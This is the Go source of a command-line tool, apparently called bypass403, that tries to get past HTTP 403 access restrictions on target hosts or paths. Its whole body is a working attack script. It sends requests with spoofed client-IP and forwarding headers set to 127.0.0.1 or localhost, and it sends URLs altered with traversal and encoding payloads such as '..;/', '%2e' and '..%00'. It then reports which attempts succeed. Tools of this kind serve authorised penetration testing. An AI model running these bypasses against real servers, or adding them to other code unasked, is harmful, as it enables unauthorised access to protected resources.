package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/drsigned/gos"
	"github.com/logrusorgru/aurora/v3"
	"github.com/valyala/fasthttp"
)

type options struct {
	hosts string
	paths string
}

var (
	o options
)

func banner() {
	fmt.Fprintln(os.Stderr, aurora.BrightBlue(`
 _                               _  _    ___ _____
| |__  _   _ _ __   __ _ ___ ___| || |  / _ \___ /
| '_ \| | | | '_ \ / _`+"`"+` / __/ __| || |_| | | ||_ \
| |_) | |_| | |_) | (_| \__ \__ \__   _| |_| |__) |
|_.__/ \__, | .__/ \__,_|___/___/  |_|  \___/____/ v1.0.0
       |___/|_|
`).Bold())
}

func init() {
	flag.StringVar(&o.hosts, "hosts", "", "")
	flag.StringVar(&o.paths, "paths", "", "")

	flag.Usage = func() {
		banner()

		h := "USAGE:\n"
		h += "  bypass403 [OPTIONS]\n"

		h += "\nOPTIONS:\n"
		h += "  -hosts          hosts 403 to bypass (use `-` to read stdin)\n"
		h += "  -paths          paths 403 to bypass (use `-` to read stdin)\n"

		fmt.Fprintf(os.Stderr, h)
	}

	flag.Parse()
}

func main() {
	if o.hosts == "" && o.paths == "" {
		os.Exit(1)
	}

	if o.hosts != "" && o.paths != "" {
		log.Fatalln(errors.New("can't use both -hosts & -paths"))
	}

	var err error
	var targets []string

	if o.hosts != "" {
		targets, err = loadURLs(o.hosts)
		if err != nil {
			log.Fatalln(err)
		}
	} else if o.paths != "" {
		targets, err = loadURLs(o.paths)
		if err != nil {
			log.Fatalln(err)
		}
	}

	for _, URL := range targets {
		if URL == "" {
			continue
		}

		parsedURL, err := gos.ParseURL(URL)
		if err != nil {
			log.Fatalln(err)
		}

		var bypasses []string

		headers := [][]string{
			{"Forwarded", "127.0.0.1"},
			{"Forwarded", "localhost"},
			{"Forwarded-For", "127.0.0.1"},
			{"Forwarded-For", "localhost"},
			{"Forwarded-For-Ip", "127.0.0.1"},
			{"X-Client-IP", "127.0.0.1"},
			{"X-Custom-IP-Authorization", "127.0.0.1"},
			{"X-Forward", "127.0.0.1"},
			{"X-Forward", "localhost"},
			{"X-Forwarded", "127.0.0.1"},
			{"X-Forwarded", "localhost"},
			{"X-Forwarded-By", "127.0.0.1"},
			{"X-Forwarded-By", "localhost"},
			{"X-Forwarded-For", "127.0.0.1"},
			{"X-Forwarded-For", "localhost"},
			{"X-Forwarded-For-Original", "127.0.0.1"},
			{"X-Forwarded-For-Original", "localhost"},
			{"X-Forwared-Host", "127.0.0.1"},
			{"X-Forwared-Host", "localhost"},
			{"X-Host", "127.0.0.1"},
			{"X-Host", "localhost"},
			{"X-Originating-IP", "127.0.0.1"},
			{"X-Remote-IP", "127.0.0.1"},
			{"X-Remote-Addr", "127.0.0.1"},
			{"X-Remote-Addr", "localhost"},
			{"X-Forwarded-Server", "127.0.0.1"},
			{"X-Forwarded-Server", "localhost"},
			{"X-HTTP-Host-Override", "127.0.0.1"},
		}

		if o.paths != "" {
			payloads := []string{"?", "??", "???", "&", "#", "%", "%20", "%20/", "%09", "/", "//", "/.", "/~", ";/", "/..;/", "../", "..%2f", "..;/", "../", "\\..\\.\\", ".././", "..%00", "..%0d/", "..5c", "..\\", "..%ff/", "%2e%2e%2f", ".%2e/", "%3f", "%26", "%23", ".json"}

			for _, payload := range payloads {
				bypasses = append(bypasses, fmt.Sprintf("%s%s", parsedURL.String(), payload))
			}

			bypasses = append(bypasses, parsedURL.Scheme+"://"+parsedURL.DomainName+"/%2e"+parsedURL.Path)
			bypasses = append(bypasses, fmt.Sprintf("%s://%s/%s//", parsedURL.Scheme, parsedURL.DomainName, parsedURL.Path))
			bypasses = append(bypasses, fmt.Sprintf("%s://%s/.%s/./", parsedURL.Scheme, parsedURL.DomainName, parsedURL.Path))
		}

		for _, bypass := range bypasses {
			req := fasthttp.AcquireRequest()
			res := fasthttp.AcquireResponse()

			defer func() {
				fasthttp.ReleaseRequest(req)
				fasthttp.ReleaseResponse(res)
			}()

			req.SetRequestURI(bypass)

			client := &fasthttp.Client{}
			if err := client.Do(req, res); err != nil {
				continue
			}

			fmt.Println(res.StatusCode(), "-", bypass)
		}

		for j := 0; j < len(headers); j++ {
			req := fasthttp.AcquireRequest()
			res := fasthttp.AcquireResponse()

			defer func() {
				fasthttp.ReleaseRequest(req)
				fasthttp.ReleaseResponse(res)
			}()

			req.SetRequestURI(parsedURL.String())
			req.Header.Set(headers[j][0], headers[j][1])

			client := &fasthttp.Client{}
			if err := client.Do(req, res); err != nil {
				continue
			}

			fmt.Println(res.StatusCode(), "-", parsedURL.String(), "-", headers[j][0])
		}
	}
}

func loadURLs(file string) (URLs []string, err error) {
	var scanner *bufio.Scanner

	if file == "-" {
		if !gos.HasStdin() {
			return URLs, errors.New("no stdin")
		}

		scanner = bufio.NewScanner(os.Stdin)
	} else {
		openedFile, err := os.Open(file)
		if err != nil {
			return URLs, err
		}

		defer openedFile.Close()

		scanner = bufio.NewScanner(openedFile)
	}

	for scanner.Scan() {
		URLs = append(URLs, scanner.Text())
	}

	if scanner.Err() != nil {
		return URLs, scanner.Err()
	}

	return URLs, nil
}
